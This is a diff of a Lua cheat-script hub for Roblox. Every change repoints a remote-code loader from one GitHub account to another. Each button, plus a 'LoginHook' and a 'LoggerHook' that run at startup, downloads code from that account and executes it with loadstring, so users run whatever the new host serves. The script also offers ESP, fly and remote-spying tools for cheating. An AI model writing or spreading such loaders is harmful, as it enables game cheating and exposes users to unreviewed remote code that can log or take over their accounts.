@@ -1,5 +1,5 @@
 -- Services
-loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/KuroLoginHook.lua"))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/KuroLoginHook.lua"))()
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
@@ -9,7 +9,7 @@ local ProximityPromptService = game:GetService("ProximityPromptService")
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
-local KuroNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/kuro5222/Kuro/main/KuroLoggerHook.lua"))()
+local KuroNotif = loadstring(game:HttpGet("https://raw.githubusercontent.com/kiro-git/Kuro/main/KuroLoggerHook.lua"))()
 
 -- Variables
 local GrowGame = 126884695634066
@@ -282,7 +282,7 @@ end)
 PlayerTab:CreateButton({
     Name = "🕊️Fly gui",
     Callback = function()
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/fly%20gui.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/fly%20gui.lua"))()
         Notif:sendnotif("Fly Gui")
     end,
 })
@@ -290,7 +290,7 @@ PlayerTab:CreateButton({
 PlayerTab:CreateButton({
     Name = "Jork",
     Callback = function()
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/Jork.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/Jork.lua"))()
         Notif:sendnotif("Jork")
     end,
 })
@@ -448,7 +448,7 @@ UtilityTab:CreateInput({
 UtilityTab:CreateButton({
     Name = "Esp on",
     Callback = function()
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/Esp.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/Esp.lua"))()
         Notif:sendnotif("Esp On")
     end,
 })
@@ -456,7 +456,7 @@ UtilityTab:CreateButton({
 UtilityTab:CreateButton({
     Name = "Esp off",
     Callback = function()
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/Remove.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/Remove.lua"))()
         Notif:sendnotif("Esp Off")
     end,
 })
@@ -795,7 +795,7 @@ local GuiTab = Window:CreateTab("Gui", nil)
 GuiTab:CreateButton({
     Name = "⌨️keyboard",
     Callback = function()
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/Keyboard.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/Keyboard.lua"))()
         Notif:sendnotif("keyboard")
     end,
 })
@@ -803,7 +803,7 @@ GuiTab:CreateButton({
 GuiTab:CreateButton({
     Name = "📒Notepad",
     Callback = function()
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/notepad.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/notepad.lua"))()
         Notif:sendnotif("Notepad")
     end,
 })
@@ -811,7 +811,7 @@ GuiTab:CreateButton({
 GuiTab:CreateButton({
     Name = "Universal Viewer",
     Callback = function()
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/Universe%20Viewer.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/Universe%20Viewer.lua"))()
         Notif:sendnotif("Universal Viewer")
     end,
 })
@@ -819,7 +819,7 @@ GuiTab:CreateButton({
 GuiTab:CreateButton({
     Name = "👀Simple Spy",
     Callback = function()
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/SimpleSpy.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/SimpleSpy.lua"))()
         Notif:sendnotif("Simple Spy")
     end,
 })
@@ -827,7 +827,7 @@ GuiTab:CreateButton({
 GuiTab:CreateButton({
     Name = "🗂️Dex v3",
     Callback = function()
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/DexMobile.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/DexMobile.lua"))()
         Notif:sendnotif("Dex v3")
     end,
 })
@@ -835,7 +835,7 @@ GuiTab:CreateButton({
 GuiTab:CreateButton({
     Name = "🔒ShiftLock",
     Callback = function()
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/ShiftLock.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/ShiftLock.lua"))()
         Notif:sendnotif("ShiftLock")
     end,
 })
@@ -843,7 +843,7 @@ GuiTab:CreateButton({
 --[[GuiTab:CreateButton({
     Name = "Executor",
     Callback = function()
-        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kuro5222/Kuro/main/executor.lua"))()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/kiro-git/Kuro/main/executor.lua"))()
     end,
 })]]
 
